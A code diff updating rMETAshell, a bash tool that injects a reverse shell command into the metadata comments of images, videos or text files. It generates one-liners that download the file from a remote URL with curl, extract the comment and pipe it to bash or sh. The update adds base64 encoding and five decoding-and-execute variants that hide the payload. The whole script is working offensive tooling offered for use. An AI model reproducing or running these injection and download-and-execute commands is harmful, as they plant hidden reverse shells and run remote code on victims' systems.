@@ -1,23 +1,21 @@
 #!/bin/bash
 #
-# Ver. Sat/Sept/30/2023
+# Ver. Sun/Jan/28/2024
+# New update! - Added base64 encoding option
+# plus 5 decoding methods for your one-liner!
 #-------------------------------------------------
 #
-# From: LoxoSec with ❤️
+# From: git5 with ❤️
 #
-# rMETAshell - A reverse shell metadata injection
-# and one-liner generator tool!
+# rMETAshell - A metadata command injection
+# one-liner generator and more!
 #
-# git5
 # ------------------------------------------------
 # Github
 # https://github.com/git5loxosec
 # ------------------------------------------------
 # Website
 # https://www.LoxoSec.rf.gd
-# ------------------------------------------------
-# Whatsapp group (Latin/Hispanic/International)
-# https://chat.whatsapp.com/Iv7lplJVgM16FeuIzKhFxj
 # ------------------------------------------------
 # X
 # https://x.com/git5loxosec
@@ -26,16 +24,19 @@
 # https://www.facebook.com/profile.php?id=61551530174528
 # ------------------------------------------------
 
+#!/bin/bash
+
 show_help() {
     echo -e "\e[36mUsage: $0 [OPTIONS] <REVERSE_SHELL_COMMAND> <filename> <URL>\e[0m"
-    echo -e "\e[36mInject a reverse shell command into a file, generate a one-liner execution method, and upload the file.\e[0m"
+    echo -e "\e[36mInject a command into a media file, generate a one-liner execution method and more!.\e[0m"
     echo ""
     echo -e "\e[36mOptions:\e[0m"
     echo "  -h, --help           Display this help message."
+    echo "  -e, --encode         Encode the one-liner with base64."
     echo ""
     echo -e "\e[36mArguments:\e[0m"
     echo -e "\e[36m  <REVERSE_SHELL_COMMAND> The reverse shell command to inject.\e[0m"
-    echo -e "\e[36m  <filename>            The name of the file.\e[0m"
+    echo -e "\e[36m  <filename>            The name of the file (e.g., example.png OR example.mp4.\e[0m"
     echo -e "\e[36m  <URL>                 The URL path to upload the file (e.g., http://www.example.com).\e[0m"
     echo ""
 }
@@ -51,6 +52,7 @@ contains_element() {
     return 1  
 }
 
+# Variables for file compatibility
 media_compat_file="db/media_compatibility.txt"
 text_compat_file="db/text_compatibility.txt"
 
@@ -68,23 +70,42 @@ else
     exit 1
 fi
 
-if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
-    show_help
-    exit 0
-fi
+# Flag for base64
+encode_base64=false
 
+# Parse command line
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        -h|--help)
+            show_help
+            exit 0
+            ;;
+        -e|--encode)
+            encode_base64=true
+            shift
+            ;;
+        *)
+            break
+            ;;
+    esac
+done
+
+# Check for the correct number of arguments
 if [ $# -ne 3 ]; then
     echo -e "\e[91mError: Invalid number of arguments.\e[0m"
     show_help
     exit 1
 fi
 
+# Assign arguments
 command="$1"
 filename="$2"
 url="$3"
 
+# Extract file extension
 file_extension="${filename##*.}"
 
+# Inject the reverse shell command into the file
 if contains_element "$file_extension" "$media_compatibility"; then
     echo -e "\e[95mInjecting reverse shell into media file...\e[0m"
     exiftool -Comment="$command" "$filename"
@@ -105,6 +126,7 @@ else
     fi
 fi
 
+# Generate one-liner method
 echo -e "\e[36mSelect a one-liner method:\e[0m"
 echo -e "\e[36mExecution methods compatible with image file format:\e[0m"
 echo "1. image-exiftool-one-liner"
@@ -122,47 +144,32 @@ echo -e "\e[36mExecution method for an infected image/video saved in a zip:\e[0m
 echo "8. image/video-exiftool-zip-one-liner"
 read -p "Enter the method number (1-8): " method_choice
 
+# Generare the one-liner based on the method chosen
 case "$method_choice" in
     1)
-        echo -e "\e[37mGenerating one-liner method with exiftool..."
-        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
-        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
+        cmd="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
         ;;
     2)
-        echo -e "\e[37mGenerating one-liner method with exiv2..."
-        one_liner="curl -s '$url/$filename' -o $filename | exiv2 -p c $filename | bash"
-        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
+        cmd="curl -s '$url/$filename' -o $filename | exiv2 -p c $filename | bash"
         ;;
     3)
-        echo -e "\e[37mGenerating one-liner method with identify..."
-        one_liner="curl -s '$url/$filename' | identify -format '%c' - | bash"
-        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
+        cmd="curl -s '$url/$filename' | identify -format '%c' - | bash"
         ;;
     4)
-        echo -e "\e[37mGenerating one-liner method with file and grep..."
-        one_liner="curl -s '$url/$filename' | file - | grep -oP 'comment: "\K[^"]*' | bash"
-        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
+        cmd="curl -s '$url/$filename' | file - | grep -oP 'comment: \"\K[^\"]*' | bash"
         ;;
     5)
-        echo -e "\e[37mGenerating one-liner method with exiftool..."
-        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
-        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
+        cmd="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
         ;;
     6)
-        echo -e "\e[37mGenerating one-liner method with ffprobe..."
-        one_liner="curl -s '$url/$filename' -o $filename | ffprobe $filename -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash"
-        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
+        cmd="curl -s '$url/$filename' -o $filename | ffprobe $filename -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash"
         ;;
     7)
-        echo -e "\e[37mGenerating one-liner method with sed for text based files..."
-        one_liner="curl -s '$url/$filename' | sed 's#<rs>##g' | sed 's#</rs>##' | bash"
-        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
+        cmd="curl -s '$url/$filename' | sed 's#<rs>##g' | sed 's#</rs>##' | bash"
         ;;
     8)
-        echo -e "\e[37mGenerating one-liner method with exiftool for extracting the reverse shell injected on the image/video file..."
         read -p "Enter the name of the file inside the ZIP archive: " filename2
-        one_liner="curl -s '$url/$filename' -o $filename && unzip -p $filename $filename2 > $filename2 && exiftool -Comment -b $filename2 | bash && rm $filename2"
-        echo -e "Generated one-liner:\n\e[32m$one_liner\e[0m"
+        cmd="curl -s '$url/$filename' -o $filename && unzip -p $filename $filename2 > $filename2 && exiftool -Comment -b $filename2 | bash && rm $filename2"
         ;;
     *)
         echo -e "\e[91mError: Invalid method number.\e[0m"
@@ -170,4 +177,42 @@ case "$method_choice" in
         ;;
 esac
 
-echo -e "\e[37mOne-liner method execution completed.\e[0m"
+# Output the final one-liner with or without encoding and decoding method
+if [ "$encode_base64" = true ]; then
+    encoded_cmd=$(echo -n "$cmd" | base64)
+    encoded_cmd="${encoded_cmd//[$'\t\r\n ']/}"
+    echo -e "\e[0;36mSelect a decoding method:\e[0m"
+    echo "1. Using awk"
+    echo "2. Using xargs"
+    echo "3. Direct execution in a subshell"
+    echo "4. Using sed"
+    echo "5. Using a here document"
+    read -p "Enter the decoding method number (1-5): " decode_method
+
+    case "$decode_method" in
+        1)
+            echo "echo '$encoded_cmd' | awk '{ print \$0}' | base64 -d | sh"
+            ;;
+        2)
+            echo "echo '$encoded_cmd' | base64 -d | xargs -I {} sh -c \"{}\""
+            ;;
+        3)
+            echo "sh -c \"\$(echo '$encoded_cmd' | base64 -d)\""
+            ;;
+        4)
+            echo "echo '$encoded_cmd' | base64 -d | sed 's/\$/\n/' | sh"
+            ;;
+        5)
+            echo "base64 -d <<< '$encoded_cmd' | sh"
+            ;;
+        *)
+            echo "Invalid decoding method number."
+            exit 1
+            ;;
+    esac
+else
+    one_liner="$cmd"
+    echo -e "Generated one-liner:\n\e[0;31m$one_liner\e[0m"
+fi
+
+echo -e "\e[0;36mOne-liner method execution completed.\e[0m"
